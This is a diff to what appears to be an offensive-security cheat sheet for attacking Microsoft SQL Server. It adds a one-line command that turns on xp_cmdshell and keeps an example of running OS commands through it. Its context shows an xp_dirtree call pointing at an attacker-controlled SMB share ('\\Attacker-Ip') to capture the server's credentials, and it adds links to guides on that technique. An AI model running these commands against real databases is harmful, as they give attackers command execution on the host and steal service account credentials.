@@ -49,7 +49,15 @@ GO
 -- To update the currently configured value for this feature.  
 RECONFIGURE;  
 GO  
+```
 
+One-line
+```
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+```
+
+
+```
 -- Execute command
 xp_cmdshell "whoami"
 ```
@@ -83,6 +91,9 @@ declare @q varchar(200);
 set @q='\\Attacker-Ip\AnyShareName';
 exec master.dbo.xp_dirtree @q;
 ```
+
+[Medium Artcile](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)
+[Ippsec Giddy Machine](https://www.youtube.com/watch?v=J2unwbMQvUo&t=1410s)
 
 ## DBeaver
 Need to be installed
